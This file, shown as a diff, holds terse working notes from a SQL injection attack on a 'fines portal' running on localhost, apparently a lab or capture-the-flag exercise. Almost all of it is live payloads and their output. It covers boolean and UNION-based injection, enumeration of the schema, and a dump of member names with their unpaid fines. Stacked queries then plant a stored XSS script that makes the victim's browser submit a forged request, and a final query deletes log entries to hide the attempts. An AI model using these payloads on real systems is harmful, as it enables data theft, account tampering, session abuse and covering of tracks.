@@ -1,0 +1,135 @@
+inside: fines portal
+
+id: 4100001
+
+rahman-41' and '1'='1
+- output ashe
+rahman-41' and '1'='0
+- output ashe na
+
+so password field ta vulnerable
+
+
+rahman-41' order by 4 limit 1 -- -
+porjonto ashe, so columns total 4 ta
+
+' union select 1,2,3,4 -- -
+
+2,3,4 ashe
+1 use hoyna
+
+' union select 1,'',DATABASE(),4 -- -
+
+
+a1_fines 
+
+' union select 1,group_concat(table_name),'',4 from information_schema.tables where table_schema='a1_fines' -- -
+
+total 3 ta table:
+fine_record,log,member
+
+' union select 1,group_concat(column_name),'',4 from information_schema.columns where table_name='fine_record' -- -
+amount,fine_id,member_id,reason,status
+
+' union select 1,group_concat(column_name),'',4 from information_schema.columns where table_name='log' -- -
+attempted_at,id,submitted_id,submitted_secret 
+
+' union select 1,group_concat(column_name),'',4 from information_schema.columns where table_name='member' -- -
+first_name,last_name,member_id,pin
+
+
+' union select 1,group_concat(distinct status),'',4 from fine_record -- -
+
+PAID,UNPAID
+
+
+' union select 1,group_concat(column_name, ':', data_type),'',4 from information_schema.columns where table_name='fine_record' -- -
+
+amount:decimal,fine_id:int,member_id:int,reason:varchar,status:enum
+
+
+' union 
+select 1, group_concat(
+    member_id, ' ', first_name, ' ', last_name, ':', ifnull((
+        select sum(amount) from fine_record where member_id = m.member_id and status = 'UNPAID'
+    ),0), '<br>'
+), '', 4 from member m
+-- -
+
+4100001 Anika Rahman:20.25
+,4100002 Farhan Karim:41.50
+,4100003 Mehjabin Sultana:0.00
+,4100004 Tahmid Hasan:22.65
+,4100005 Nusrat Jahan:67.00
+,4100006 Samin Hossain:10.00
+,4100007 Afsana Kabir:0.00
+,4100008 Rayhan Ahmed:24.00
+,4100009 Tasnim Akter:14.00
+,4100010 Adnan Mahmud:33.30
+,4100011 Fariha Noor:6.75
+,4100012 Abrar Siddique:48.90
+,4100013 Lamisa Haque:0.00
+,4100014 Zarif Uddin:40.00
+,4100015 Maliha Khan:7.00
+
+rahman-41'; update member set last_name = '<b>Rahman</b>' where member_id = 4100001; -- -
+
+Member	Total Outstanding
+Anika <b>Rahman</b>	$20.25
+
+copy-as fetch
+
+await fetch("http://localhost:4001/list", {
+    "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-User": "?1",
+        "Priority": "u=0, i"
+    },
+    "referrer": "http://localhost:4001/",
+    "body": "title=hi&price=100",
+    "method": "POST",
+    "mode": "cors"
+});
+
+
+await fetch("http://localhost:4001/list", {
+    "credentials": "include",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+    },
+    "referrer": "http://localhost:4001/",
+    "body": "title=hi&price=100",
+    "method": "POST",
+});
+
+rahman-41'; 
+UPDATE member m SET last_name = CONCAT(
+    '<script>
+        fetch("http://localhost:4001/list", 
+        {
+            method: "POST", 
+            headers: {"content-type": "application/x-www-form-urlencoded"}, 
+            credentials: "include", 
+            body: "title=I+owe+', 
+            (
+                select 
+                sum(amount) from fine_record where member_id = m.member_id AND status = 'UNPAID'), 
+                '+in+fines&price=', 
+                (SELECT SUM(amount) FROM fine_record WHERE member_id = m.member_id AND status = 'UNPAID'), 
+                '"});
+    </script>'
+) 
+WHERE member_id = 4100001; 
+-- -
+
+
+rahman-41'; DELETE FROM log WHERE submitted_id = 4100001; -- -
+
